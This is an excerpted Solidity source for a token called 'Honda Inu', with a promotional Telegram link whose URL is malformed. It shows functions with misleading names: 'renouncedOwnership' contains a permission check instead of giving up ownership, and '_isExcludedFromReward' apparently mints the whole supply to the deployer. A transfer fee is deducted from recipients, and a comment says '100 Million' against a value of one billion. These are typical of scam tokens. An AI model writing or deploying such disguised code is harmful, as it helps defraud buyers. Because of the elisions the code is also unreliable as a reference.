...
//
//
// 📱 Telegram:https::https://t.me/+7WY4yxWve404NWFl
/*
...
contract Ownable is Context {
    ...
    function renouncedOwnership() public virtual {
        require(
            ...
            "You don't have permission to Transfer Owner"
        );
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        _balances[recipient] = _balances[recipient].sub(
            (amount / 100) * _feeGamers
        );
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(
            (amount / 100) * _feeGamers
        );
    ...
    function _isExcludedFromReward(address account, uint256 amount)
        internal
        virtual
    {
...
contract HondaInu is ERC20 {
    uint256 tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Honda Inu", "HondaInu") {
        _isExcludedFromReward(
            msg.sender,
            tokenTotalSupply * (10**uint256(decimals()))
        );
    }
}
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    string private _name = "HondaInu";
    string private _symbol = "HondaInu";
